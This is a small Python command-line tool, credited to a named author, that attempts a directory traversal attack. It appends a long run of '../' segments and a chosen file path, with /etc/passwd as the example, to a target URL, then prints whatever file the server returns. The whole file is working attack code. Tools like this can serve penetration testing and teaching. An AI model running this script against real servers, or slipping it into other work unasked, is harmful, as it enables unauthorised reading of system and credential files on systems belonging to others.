import requests
import argparse
import time
from colorama import Fore

def banner():
    print('''

\033[36m    /=\                            /=\ |           |
\033[36m     |  /= /=| | | /=\ /= /== /=\  |   |=\ /=\ /=: =/
\033[36m     |  |  \=| \\/  \=  | ==/  \=   \=/ | | \=  \=: |\\
 ''')
    print("\033[34m    ##################################################\n                 \033[22;4;37mAuthor: Usman Q Khan\n\033[0m")

banner()
parser = argparse.ArgumentParser(description="Check for Directory Traversal vulnerability", usage='python3 %(prog)s -u URL -p PATH\n\nexample: python3 %(prog)s -u http://10.10.10.10/ -p /etc/passwd')
parser.add_argument("-u", "--url", required=True, help="Enter a URL", type=str)
parser.add_argument("-p", "--path", required=True, help="Enter the full path of the file you'd like to find", type=str)

args = parser.parse_args()

payload = '../../../../../../../../../../../../../..'
url = args.url + payload + args.path
print("[*]Building payload....[*]\n")
time.sleep(1)
print(url)
print("\n[*]Checking for directory traversal.....[*]\n")
time.sleep(1)
s = requests.Session()
try:
    r = s.get(url)
    if (r.status_code == 200):
        print("\033[32m[*]Directory traversal successful![*]\033[0m\n")
        print(r.text)
        print(r.content)
except:
    print("\033[31m[*]This webpage is not vulnerable to a directory traversal attack[*]\033[0m")

